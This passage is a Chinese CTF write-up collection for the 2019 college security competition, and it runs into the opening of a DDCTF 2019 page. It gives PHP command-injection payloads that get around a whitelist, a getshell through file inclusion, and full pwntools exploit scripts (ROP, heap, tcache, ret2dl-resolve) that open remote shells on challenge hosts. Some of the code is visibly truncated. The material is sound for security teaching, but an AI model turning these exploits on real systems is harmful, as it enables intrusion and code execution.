14、到自个儿的服务器上看看，Flag 文件也读到了。 15、Flag 到手~ Flag：flag{3f4abe8b-aa4a-bb48-c2f9f04d045beade} love_math 题目 知识点：命令注入与条件利用 1、打开靶机。发现似乎是一个计算器。 2、提交，抓包看看。 3、可以看到直接提交给 calc.php 的，那么我们就访问这个文件看看。 4、源码出来了。 = 80) { die(\"太长了不会算\"); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(\"请不要输入奇奇怪怪的字符\"); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\"请不要输入奇奇怪怪的函数\"); } } //帮你算出答案 eval('echo '.$content.';'); } 5、审计一下源码。 先判断 c 这个参数有没有，有的话就判断长度，小于 80 字节就继续往下走。然后拦截一大堆符号，再判断参数里的文本段是否在函数白名单内，都在的话，就继续执行。 6、来看看他的函数表吧。 http://www.w3school.com.cn/php/php_ref_math.asp 这个特别有意思，base_convert() 可以任意进制转换，那么我们就可以把十进制数转换为 36 进制数，这样 a~z 我们就都可以用了。 7、来一个试试。 转换工具：http://www.atool9.com/hexconvert.php 8、构造 payload 试试。访问 /calc.php?c=base_convert(55490343972,10,36)() 9、成了，那继续研究怎么绕过长度限制吧。这里的思路，就是先拿到 _GET，然后用里面的参数来作为函数的名字（这里要读文件，就是 file_get_contents 了）和参数（文件路径）了。 10、不断 fuzz，发现如下的 payload 可以。 /calc.php?abs=flag.php&pow=show_source&c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pow}($$pi{abs}) 解释一下，相当于先定义一个 pi 变量，值为 base_convert(37907361743,10,36)(dechex(1598506324)) 的结果，这里两个函数都是白名单里的 可以绕过。而 dexhex 则就是先把 “_GET” 的十进制表示转换为十六进制表示，然后其作为 base_convert(37907361743,10,36)() 的参数，而这里 base_convert(37907361743,10,36)() 就相当于 hex2bin()，把 hex 转换成文本。然后，得到 _GET 以后再后面用 ($$pi){pow}($$pi{abs}) 来调用 pow 参数里存的方法名，abs 参数里存的参数，这里的字段都在白名单，可以正确绕过。 11、打过去。 12、Flag 到手~ Flag：flag{79480116-456e-4a90-86e8-4b4b885354b9} RefSpace 通过 php伪协议 可以获得题目环境中的文件结构如下： ➜ html tree.├── app│ ├── flag.php│ ├── index.php│ └── Up10aD.php├── backup.zip├── flag.txt├── index.php├── robots.txt└── upload2 directories, 7 files 源码如下： 可以看到 index.php 中存在任意文件包含，但是限制了文件名后缀只能是 .php，而 app/Up10aD.php 文件中存在上传功能，刚好可以配合前面的文件包含进行 getshell 。具体可以参考：zip或phar协议包含文件 。getshell之后，只在服务器上发现了加密后的flag.txt。在 app/flag.php 开头添加上如下代码，访问时 $key 值随便填。 namespace interesting; function sha1($var) { // 调用类的私有、保护方法 $class = new \\ReflectionClass('interesting\\FlagSDK'); $method = $class->getMethod('getHash'); $method->setAccessible(true); $instance = $class->newInstance(); return $method->invoke($instance); } 其原理就是通过命名空间，定义一个同名函数 sha1 ，在代码调用时，会优先调用本命名空间中的同名函数。另外还有一个考点就是通过反射调用类的私有、保护方法，具体百度即可。绕过sha1的比较，我们就能拿到flag了，backup.zip/sdk开发文档.txt 中的 return \"too{young-too-simple}\" 只是个例子，其真正的语句类似 return openssl_decrypt(file_get_contents(‘flag路径), '加密算法', $key)。 其他解法: 解法二：作者：zsx Misc 作者：wu1a 签到题 打开摄像头后，有三个人被识别有绿圈，就代表成功了，cmd 界面弹出 flag saleae 一开始作为一个 web 手，完全没有接触过工控的题目，但受到题目名称的启发，搜了一下这个东西用什么软件打开，就下载了 Logic 这个软件，然后打开题目看到有过滤选项 而且只有 0 和 2 频道有波形图，调整过滤规则得到了导出后 然后编辑一下就是 flag 24c 打开给的 24c.logicdata 文件，得到：选择 i2c 过滤规则直接出现了 flag 字样直接就去提交了这个分离出来的 flag 然后一直报错，一度怀疑题目错了。直到看到有一段有读写规则的转换，才知道自己不清楚这些 flag 字段是怎么拼接的。因为对工控不是很熟悉，百度了一下 24C 芯片的数据读写规则如下，8bitdata 接上 1bitack我们导出一下获得的数据我们得到的三个字段分别为 f163bdf4e},flag{c4649e10-e9b5-4d90-a883-41c,ac现在根据规则对这三段进行拼接再导出写入的地址顺序表了解一下 24c 元件的工作原理后，再通过上表确认了 ac 并不是写在最后 flag 那一段后面的，而是插在 flag{c4649e10-e9b5-4d90-a883-41c 中的。这样就得到了拼接的顺序，得到了正确的 flag badusb 直接先打开读文件：直接调整规则进行分析，并查看数据分析结果，最终发现只在如下图所示的规则下找到了flag 字段在最后一段数据处发现了 flag导出编辑和昨天的第一题工控一样拼接后就得到了最后的 flag DaysBank 请移步至：全国大学生信息安全竞赛—区块链题目分析 Crypto 作者：wu1a、匿名 puzzles 作者：匿名 Question0 这题就是计算一个四元一次方程组，使用Python里的numpy模块进行求解。 得到结果[4006. 3053. 2503. 2560.] 整理一下得到fa6bed9c7a00 Question1 question1思考了一会，尝试从26364809开始搜素数，发现26364809是第2个素数，26366033是第76个，26366621是第113个。成一个公差为37的等差数列。所以part1是第39个素数，即26365399。part1=1924dd7 Question2、3、4 第2 3 4题在网上都可以搜到类似的题目 第一就是简单的求极限和积分。 part2=(1+91+7+1)*77=7700 转换成flag格式 part2=1e14 第三题是一道物理题目->->代入数据，最后得到结果part3=18640转换成flag格式 part3=48d0 第四题考的是三重积分令x=rcosa,y=rsina。可以将上式转化为：这样就将三重积分转化成了三次定积分。并结合等式左边的式子得出结果。part4=40320 转化成flag格式 part4=9d80 最后拼接在一起得到flag Part_des Key map 为十六进制数，转换成二进制后发现为 768 位，即 16*48，是des加密的16轮子密钥，从网上找到 des 的解密脚本，修改一下即可解出 Warmup 打开脚本查看加密逻辑，发现每次 nc连上服务器后会自动生成随机的16位key和4 位prefix、 suffix，再用 prefix 和 suffix 生成 64 位的 count，然后用 count 和 key 生成 cipher。服务得到 我的输入，在后面拼接正确的 flag 后进行 aes 加密并输出。测试一下服务爆破即可 #coding:utf-8 #__author__:wu1a from pwn import * import string def boom(k,flag): for i in range(k,len(string)): payload = flag + string[i] p.sendline(payload) aaa = p.recvline()[17:].replace(\"\\n\",\"\") aaa = aaa[:(len(flag)+1)*2] # print aaa if aaa in flag_aes: print \"ok\",payload boom(0,payload) else: pass # context.log_level='debug' p = remote(\"fc32f84bc46ac22d97e5f876e3100922.kr-lab.com\",12345) string=\"{}\" + string.ascii_lowercase + \"-0123456789\" flag=\"flag\" p.recvuntil(\"Welcome to flag getting system\\n\") p.sendline(\"\") flag_aes=p.recvline()[17:].replace(\"\\n\",\"\") log.info(\"flag_aes -> \" + flag_aes) boom(0,flag) # p.interactive() Asymmetric 打开加密脚本后发现过程类似 RSA 加密，尝试用 RSA 解密，先分解 n 得到 pP=1657407551907933046558545060527940723781810462521183676934573856328183290415 404194886254720077100621286329426643663835514524985415605387445829227138086113 201767704015876746181218857199538311224872809784181103805973587479154209280538 60076414097300832349400288770613227105348835005596365488460445438176193451867 R=4 根据欧拉函数 p4-p3 计算 n，再计算得到 flag PWN 作者：warden、wu1a your_pwn 可重复利用的单字节读写的漏洞. 先直接读取栈上的返回地址泄露pie基址.然后构造ROP链打印库函数地址泄露libc.直接调用system(binsh);获得flag. from pwn import * context.log_level = 'debug' pop_rdi_ret = 0xd03 pop_rsi_r15_ret = 0xd01 #r = process(\"./pwn\") r = remote(\"1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com\",\"57856\") r.recvuntil(\"name:\") r.sendline(\"w4rd3n\") def get(p): i = 0 ll = 0 while(1): r.recvuntil(\"index\\n\") r.sendline(str(i + p)) data = r.recvuntil(\"value\\n\")[:-17] data = int(data[-2:],16) if(i daily remove的时候没有对index进行范围检测. 先利用unsorted bin泄露libc,再利用fastbin单链表泄露heap基址. 申请一个chunk,在里面伪造一个堆指针和对应的faker chunk.free掉这个faker chunk,通过edit构造其fd到bss上,由于length可控,通过remove构造出一个chunk头部绕过检查.成功fastbin attack,获得任意读写的能力,由于程序开了Full RELRO所以劫持__free_hook调用system(binsh);获得flag. from pwn import * context.log_level = 'debug' #r = process(\"./pwn\") ptr = 0x602060 r = remote(\"85c3e0fcae5e972af313488de60e8a5a.kr-lab.com\", \"58512\") def show(): r.sendline(str(1)) data = r.recvuntil(\"Your choice:\") return data def add(length, content): r.sendline(str(2)) r.recvuntil(\"of daily:\") r.sendline(str(length)) r.recvuntil(\"daily\\n\") r.send(content) r.recvuntil(\"Your choice:\") def edit(index, content): r.sendline(str(3)) r.recvuntil(\"of daily:\") r.sendline(str(index)) r.recvuntil(\"daily\\n\") r.send(content) r.recvuntil(\"Your choice:\") def remove(index): r.sendline(str(4)) r.recvuntil(\"of daily:\") r.sendline(str(index)) r.recvuntil(\"Your choice:\") r.recvuntil(\"Your choice:\") add(0x100, 'a')#0 add(0x100, 'b')#1 add(0x100, 'c')#2 add(0x100, 'd')#3 remove(0) remove(2) add(0x100, 'a' * 8)#0 add(0x100, 'a' * 8)#2 r.sendline(str(1)) r.recvuntil(\"aaaaaaaa\") heap = u64(r.recvuntil(\"1 :\")[:-3].ljust(8,'\\0')) - 0x220 r.recvuntil(\"aaaaaaaa\") libc = u64(r.recvuntil(\"3 :\")[:-3].ljust(8,'\\0')) - 0x3c4b78 print \"heap: \" + hex(heap) print \"libc: \" + hex(libc) remove(0) remove(1) remove(2) remove(3) add(0x60, p64(heap + 0x30) * 2 + p64(0) + p64(0x51))#0 add(0x20, 'a')#1 add(0x50, 'a')#2 add(0x20, 'a')#3 remove((heap + 0x18 - ptr - 8) / 0x10) edit(0, p64(0) * 3 + p64(0x51) + p64(ptr + 0x18)) remove(1) add(0x40, 'a')#1 add(0x40, 'a')#4 edit(4, p64(ptr)) edit(2, p64(0x100) + p64(ptr) + p64(0) * 4) edit(0, p64(0x100) + p64(ptr) + p64(0x100) + p64(libc + 0x3c67a8) + p64(0x100) + p64(libc + 0x18cd57)) edit(1, p64(libc + 0x045390)) #gdb.attach(r) r.sendline(str(4)) r.recvuntil(\"of daily:\") r.sendline(str(2)) r.interactive() baby_pwn ret2dl in x86,没有可供leak的函数.保护很少,想起之前的0ctf2018 babystack,修改脚本直接打. import sys import roputils from pwn import * context.log_level = 'debug' #r = process(\"./pwn\") r = remote(\"c346dfd9093dd09cc714320ffb41ab76.kr-lab.com\", \"56833\") rop = roputils.ROP('./pwn') addr_bss = rop.section('.bss') buf1 = 'A' * 0x2c buf1 += p32(0x8048390) + p32(0x804852D) + p32(0) + p32(addr_bss) + p32(100) r.send(buf1) buf2 = rop.string('/bin/sh') buf2 += rop.fill(20, buf2) buf2 += rop.dl_resolve_data(addr_bss + 20, 'system') buf2 += rop.fill(100, buf2) r.send(buf2) buf3 = 'A' * 0x2c + rop.dl_resolve_call(addr_bss + 20, addr_bss) r.send(buf3) #gdb.attach(r) r.interactive() Virtual 理解程序逻辑. 首先是store_instruction函数将输入通过分隔符分类为各种操作符并保存在堆中,store_num同理.其中三个堆块一个数据堆,一个操作符堆,一个栈(也是用来存数据的,存储操作符操作的数据). 重点就是op函数. 这里不断从操作符堆取出操作符(对应的数字),然后跳转到函数执行的地方,这里IDA反汇编有问题,没有识别出函数调用,实际上i会被赋值为函数调用的返回值. 这些函数操作栈中的数据并将结果放回栈中,所以使用数据前需要先push. 关键函数是load和save,知道偏移就可以任意读写.先使用load泄露堆上的堆地址,由于没开pie,通过-和/求出.got[puts]和此处偏移,再次load泄露libc,处理与system的偏移获得system地址.不过这里没办法复制保存数据,只能移动和计算,所以之前的偏移没了,通过同样操作调整一下再次获得.got[puts]偏移,调用save成功劫持puts@plt.突然发现username作用,开始试了/bin/sh,ls,cat flag什么的都是comment not found,最后/bin/bash成功. from pwn import * #context.log_level = 'debug' #r = process(\"./pwn\") r = remote(\"a569f7135ca8ce99c68ccedd6f3a83fd.kr-lab.com\", \"40003\") r.recvuntil(\"Your program name:\\n\") r.sendline(\"/bin/bash\") r.recvuntil(\"Your instruction:\\n\") payload = \"push push push load push sub div sub load push add\" payload += \" push push push load push sub div sub save\" #payload = \"push push push load push sub div sub load pop\" r.sendline(payload) #gdb.attach(r) r.recvuntil(\"Your stack data:\\n\") #payload = \"-1 8 -5 4210720\" payload = \"-1 8 -5 4210720 -172800 -1 8 -6 4210720\" #0x404020 = 4210720,offset = -172800,one_gadget = -173178 r.sendline(payload) #print r.recv() r.interactive() bms 远端环境是libc2.26,可以使用tcache攻击,利用double free把chunk分配在stdout附近,使tcache bin指向_IO_2_1_stdout_. 修改结构体泄露libc,再次使用tcache攻击分配chunk到__free_hook,劫持为one_gadget,调用free获得shell. from pwn import * context.log_level = 'debug' #r = process(\"./pwn\") r = remote(\"39.106.224.151\", \"60002\") def add(name, length, content): r.send(str(1)) r.recvuntil(\"book name:\") r.send(name) r.recvuntil(\"description size:\") r.send(str(length)) r.recvuntil(\"description:\") r.send(content) r.recvuntil(\">\\n\") def remove(index): r.sendline(str(2)) r.recvuntil(\"index:\") r.sendline(str(index)) r.recvuntil(\">\\n\") r.recvuntil(\"username:\") r.send(\"admin\\n\\x00\") r.recvuntil(\"password:\") r.send(\"frame\\n\\x00\") r.recvuntil(\">\\n\") add(\"a\", 0xf0, \"a\")#0 remove(0) remove(0) add(\"a\", 0xf0, p64(0x602020))#1 add(\"a\", 0xf0, p64(0x602020))#2 add(\"a\", 0xf0, p8(0x20))#3 r.send(str(1)) r.recvuntil(\"book name:\") r.send(\"a\") r.recvuntil(\"description size:\") r.send(str(0xf0)) r.recvuntil(\"description:\") r.send(p64(0xfbad2887) + p64(0x601F70) * 4)#4 libc = u64(r.recvuntil(\">\\n\")[:6].ljust(8, '\\0')) - 0x78460 add(\"a\", 0xe0, \"a\")#5 remove(5) remove(5) add(\"a\", 0xe0, p64(libc + 0x3dc8a8))#6 add(\"a\", 0xe0, p64(libc + 0x3dc8a8))#7 add(\"a\", 0xe0, p64(libc + 0x47c46))#8 r.sendline(str(2)) r.recvuntil(\"index:\") r.sendline(str(5)) #gdb.attach(r) print \"libc: \" + hex(libc) r.interactive() double 这题的点找了好久，一直没 get 到，（没注意题目名，手动滑稽），研究了各种姿势，回原点，两个同样的文件释放会报 double free 的错，才发现自己漏看了一块地方，然后利用文件内容一致，引用同一文件。实现 double free。然后 fastbin attack再次 diss，主办方的 check 竟然 system(“sh”) ，命令在容器里啥权限都没，还不让我过，搞得我只好找 onegadget from pwn import * context.log_level = \"debug\" p = process(\"./pwn\") p = remote(\"e095ff54e419a6e01532dee4ba86fa9c.kr-lab.com\",40002) elf = ELF('./pwn') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def add(content): p.recvuntil('> ') p.sendline('1') p.recvuntil('Your data:\\n') p.send(content) def edit(index,content): p.recvuntil('> ') p.sendline('3') p.recvuntil('Info index: ') p.sendline(str(index)) p.send(content) def show(index): p.recvuntil('> ') p.sendline('2') p.recvuntil('Info index: ') p.sendline(str(index)) def delete(index): p.recvuntil('> ') p.sendline('4') p.sendline(str(index)) add(0x50*'s'+'\\n') add(0x60*'s'+'\\n') add(0x60*'s'+'\\n') add(0x60*'b'+'\\n') delete(1) delete(3) delete(2) add(p64(0x4040bd).ljust(0x60,'c')+'\\n') add(0x60*'n'+'\\n') add(0x60*'m'+'\\n') payload = 'd'*3 + p64(0x4040e0) + p64(0x4040f0) + p32(0) + p32(20) + p64(elf.got['read'])+p64(0x4040f0) add((0x60*'\\x00')+'\\n') edit(0,payload+'\\n') show(0) readaddr = u64(p.recv(6).ljust(8,'\\x00')) libcaddr = readaddr - libc.symbols['read'] print \"libc---->\",hex(libcaddr) edit(0,p64(libcaddr + 0x4526a)+'\\n') p.sendline('icqf3f12bdf6e59569e295aacbd704b2') p.interactive() Reverse 作者：lizhirui、impakho bbvvmm 一道考察虚拟机和加密算法的逆向题。大致流程如下。 输入用户名和密码，用户名和密码会被分开校验。 用户名为 8字节 长度，先被 bin2hex 处理变成 16字节 长度。 sm4_keyext 进行密钥扩展，与处理后的用户名一起参与 sm4 加密。 加密结果进行 bin2hex 处理，再进行一个被修改过编码表的 base64 编码，最后比较 base64 的内容。 结合网上的代码进行修改，写出这部分的解密代码，得到用户名：badrer12。 import string base64_charset = 'IJLMNOPKABDEFGHCQRTUVWXSYZbcdefa45789+/6ghjklmnioprstuvqwxz0123y' def b64encode(origin_bytes): base64_bytes = ['{:0>8}'.format(str(bin(b)).replace('0b', '')) for b in origin_bytes] resp = '' nums = len(base64_bytes) // 3 remain = len(base64_bytes) % 3 integral_part = base64_bytes[0:3 * nums] while integral_part: tmp_unit = ''.join(integral_part[0:3]) tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]] resp += ''.join([base64_charset[i] for i in tmp_unit]) integral_part = integral_part[3:] if remain: remain_part = ''.join(base64_bytes[3 * nums:]) + (3 - remain) * '0' * 8 tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1] resp += ''.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * '=' return resp def b64decode(base64_str): base64_bytes = ['{:0>6}'.format(str(bin(base64_charset.index(s))).replace('0b', '')) for s in base64_str if s != '='] resp = bytearray() nums = len(base64_bytes) // 4 remain = len(base64_bytes) % 4 integral_part = base64_bytes[0:4 * nums] while integral_part: tmp_unit = ''.join(integral_part[0:4]) tmp_unit = [int(tmp_unit[x: x + 8], 2) for x in [0, 8, 16]] for i in tmp_unit: resp.append(i) integral_part = integral_part[4:] if remain: remain_part = ''.join(base64_bytes[nums * 4:]) tmp_unit = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)] for i in tmp_unit: resp.append(i) return resp Sbox = [ [0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05], [0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99], [0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62], [0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6], [0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8], [0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35], [0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0x78, 0x87], [0xD4, 0x00, 0x46, 0x57, 0x9F, 0xD3, 0x27, 0x52, 0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E], [0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1], [0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3], [0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F], [0xD5, 0xDB, 0x37, 0x45, 0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51], [0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8], [0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0], [0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84], [0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48] ] CK = [ 0x00070e15L, 0x1c232a31L, 0x383f464dL, 0x545b6269L, 0x70777e85L, 0x8c939aa1L, 0xa8afb6bdL, 0xc4cbd2d9L, 0xe0e7eef5L, 0xfc030a11L, 0x181f262dL, 0x343b4249L, 0x50575e65L, 0x6c737a81L, 0x888f969dL, 0xa4abb2b9L, 0xc0c7ced5L, 0xdce3eaf1L, 0xf8ff060dL, 0x141b2229L, 0x30373e45L, 0x4c535a61L, 0x686f767dL, 0x848b9299L, 0xa0a7aeb5L, 0xbcc3cad1L, 0xd8dfe6edL, 0xf4fb0209L, 0x10171e25L, 0x2c333a41L, 0x484f565dL, 0x646b7279L ] FK = [0xA3B1BAC6L, 0x56AA3350L, 0x677D9197L, 0xB27022DCL] def LeftRot(n, b): return (n > 32 - b) & 0xffffffff def t(a): a4=a>>4 a3=a4>>4 a2=a3>>8 a1=a2>>8 return (Sbox[a1>>4][a1&0xf] >4&0xf][a2&0xf] >4&0xf][a3&0xf] > (128-32),(m >> (128-32*2))&0xffffffff,(m >> 32)&0xffffffff,m&0xffffffff] Y=[lbc(key >> (128-32)),lbc((key >> (128-32*2))&0xffffffff),lbc((key >> 32)&0xffffffff),lbc(key&0xffffffff)][::-1] K=[Y[i]^FK[i] for i in xrange(4)] for i in xrange(32): K.append(K[i]^T_(K[i+1]^K[i+2]^K[i+3]^CK[i])) X=sm4(X,K,1) username='' for i in xrange(4): username += hex(X[i])[2:-1].decode('hex').decode('hex') print username 除了已经得到的用户名，还需要得到密码才能登录进去拿到 Flag。 这里要求输入 6 字节的密码，然后放到 ptr + 4 (i + 0x24LL) 处。而这个 ptr 是在初始化虚拟机的时候定义的。虚拟机运行完毕，`((_DWORD *)ptr + 0x19)` 要等于 0。 现在开始分析这个虚拟机的构造。 这里初始化了虚拟寄存器，基于物理堆实现的虚拟栈，虚拟机指令及其对应的处理函数，虚拟指令表等。 这是虚拟机运行时，需要执行的虚拟指令表。 这是一条执行虚拟机指令表的循环语句，结束标志为 0xFF。刚好对应上虚拟指令表最后一个指令。 到这里就需要启动 人肉虚拟机指令翻译器，它能够结合指令处理函数和指令表，将每一条指令翻译成伪汇编语句。 B0 19 00 00 00: push 0x19 B5 0A: pop r6 B2 0B: push r7 B4 09: pop ptr[r6] B0 1A 00 00 00: push 0x1A B5 0A: pop r6 04 0B 09: r7=ptr[r6] B0 1A 00 00 00: push 0x1A B5 0A: pop r6 B2 0B: push r7 B4 09: pop ptr[r6] 90 C2 00 00 00: jmp 0xC2 91: jmp next 01 1A 00 00 00 0A: r6=0x1A 02 09 00: r1=ptr[r6] 10 09 30 00 00 00 01: r2=&ptr[0x30] B2 01: push r2 B2 00: push r1 C0: *(s0r-1)+=*(s0r-2) B5 00: pop r1 B0 F4 FF FF FF: push 0xFFFFFFF4 B5 0A: pop r6 B1 00: push r1[r6] B5 01: pop r2 01 1A 00 00 00 0A: r6=0x1A B1 09: push ptr[r6] B5 00: pop r1 10 00 78 00 00 00 00: r1+=0x78 70 00 FF 00 00 00 00: r1&=0xFF 50 00 18 00 00 00 00: r1>*(s0r-1) B5 00: pop r1 B2 01: push r2 B2 00: push r1 C3: *(s0r-1)^=*(s0r-2) B5 00: pop r1 50 00 18 00 00 00 00: r1>*(s0r-1) B5 00: pop r1 70 00 FF 00 00 00 01: r2=0xFF&r1 01 19 00 00 00 0A: r6=0x19 02 09 00: r1=ptr[r6] 11 01 00 00: r1+=r2 B0 19 00 00 00: push 0x19 B5 0A: pop r6 B2 00: push r1 B4 09: pop ptr[r6] 01 1A 00 00 00 0A: r6=0x1A B1 09: push ptr[r6] B5 00: pop r1 10 00 01 00 00 00 00: r1+=0x01 01 1A 00 00 00 0A: r6=0x1A 04 00 09: ptr[r6]=r1 B0 1A 00 00 00: push 0x1A B5 0A: pop r6 02 09 00: r1=ptr[r6] 86 00 06 00 00 00 00: r1=r1不过这样还是有点难看懂，那不妨将 `人肉虚拟机指令翻译器`` 的功率调大，让它输出更加美妙而神奇的代码。 ptr_0x1A=0 password='******' for i in range(0x06): ptr_0x1A+=ord(password[i])^(0x78+i) 这样的代码具有很强的艺术观赏性。怀着美好的心情，掐指一算密码就是 xyz{|}。 借助 自然之力 登录进去，顺利拿到 pizza大佬 留下的丰厚宝藏：pizza's原味flag 一枚。 from pwn import * io=remote('39.106.224.151', 10001) io.send('badrer12\\n') io.send('xyz{|}') io.interactive() Flag: flag{eafd_134g_vp1d_vsdr_v5yg_ai0g_fsdg_g24t_sdfg} easygo 根据题目名称和 IDA 结合来看，猜测是一个 go 写的程序。 程序的符号信息被去除了，用 IDAGolangHelper 恢复符号信息。 然后看main_main 函数，在encoding_base64__ptr_Encoding_DecodeString 处下断点。 单步调试到这里，跟进 rsi 地址的内存数据，就能看到 flag 了。 Flag: flag{92094daf-33c9-431e-a85a-8bfbd5df98ad} strange_int 篇幅问题，请移步：https://www.52pojie.cn/thread-936377-1-1.html 评论区 请文明评论，禁止广告 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-07-20 21:53:54 0 issues reported "},"articals/2019ddctf.html":{"url":"articals/2019ddctf.html","title":"2019DDCTF","keywords":"","body":"2019DDCTF滴滴高校闯关赛 本题已开通评论，欢迎在页面最下方留言吐槽。 题目类型： 类型 年份 难度 官方赛事题 2019 中 题目下载： 链接: https://pan.baidu.com/s/16CV9YL5maNYIi-TbXzMWHg 提取码: tdbs 网上公开WP： https://mp.weixin.qq.com/s/eYCP2L6kK0mpg8CURIJajQ https://mp.weixin.qq.com/s/af5KMZ5AZ4Xk8jJanGu4mQ https://mp.weixin.qq.com/s/zFcVYOE383kheD08j21PBg https://mp.weixin.qq.com/s/cRQQ-3-V-E-I22G_uJRZgw https://mp.weixin.qq.com/s/NmgVHSMxIAh0iSOe5fdWgQ https://xz.aliyun.com/t/4862 https://xz.aliyun.com/t/4849 https://github.com/neverlovelynn/DDCTF-2019-web-mysql-write-up https://mp.weixin.qq.com/s?__biz=MzA3Mzk1MDk1NA==&mid=2651905380&idx=1&sn=2d85c96fe650fb625b53fbf8536ee0f5&chksm=84e34ee1b394c7f7d6d9302d5ebe0be50b1444b02a3b7f250f3898040618a9525532ba23f854&mpshare=1&scene=23&srcid=#rd http://cdusec.happyhacking.top/?post=49 https://www.zhaoj.in/read-5269.html http://12end.xyz/ddctf-writeup/ http://yuufeng.com/ https://blog.csdn.net/m0_37809075/article/details/89280350 https://www.xmsec.cc/p/4891b1d2-1166-4553-951c-d46cbac95af3/ http://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485730&idx=1&sn=cb90f178c56453f558acc626ec84ddad&chksm=e89e21fadfe9a8ecca8ac397984045c7ebda97577ac082d94141d37d0b12d70222128f0af2e7&mpshare=1&scene=23&srcid=#rd 本站备份WP： 感谢作者：evoA、5am3、Glzjin、12end、admin-琴里、Yunen WEB 滴~ 本题作者：Yunen 题目地址：http://117.51.150.246/打开题目：发现页面进行了一次调整，跳转后的url：http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09猜测jpg参数的值为base64编码后的内容，解码内容如下：NjY2QzYxNjcyRTZBNzA2Nw==明显的base64编码，再进行一次解码：666C61672E6A7067观察数据，发现两两一组时，字母全在数字后，且范围在[A-F]之内，猜测为HEX，将其转换为Ascii试试：flag.jpg明显的任意文件读取漏洞，尝试读取index.php将index.php其转换成HEX，再两次转Base64得：TmprMlpUWTBOalUzT0RKbE56QTJPRGN3替换原来的jpg值访问：红框部分即为index.php的base64编码过的内容，复制下来解码得： '.$_GET['jpg'].''; $file = preg_replace(\"/[^a-zA-Z0-9.]+/\",\"\", $file); echo $file.''; $file = str_replace(\"config\",\"!\", $file); echo $file.''; $txt = base64_encode(file_get_contents($file)); echo \"\"; /* * Can you find the flag file? * */ ?> 题目提示了一个url，还有一个日期(2018-7-4)。 打开提示文章，发现该文章发表时间与提示时间不同。打开作者首页，找到2018-7-4发表的文章：https://blog.csdn.net/FengBanLiuYun/article/details/80913909这里有个巨大脑洞！！写这题的时候真想杀了出题人猜测存在备份文件practice.txt.swp，访问之~:提示flag存在于f1ag!ddctf.php文件，使用index.php读取之~由于$file = preg_replace(\"/[^a-zA-Z0-9.]+/\",\"\", $file);，我们无法直接输入!不过由于$file = str_replace(\"config\",\"!\", 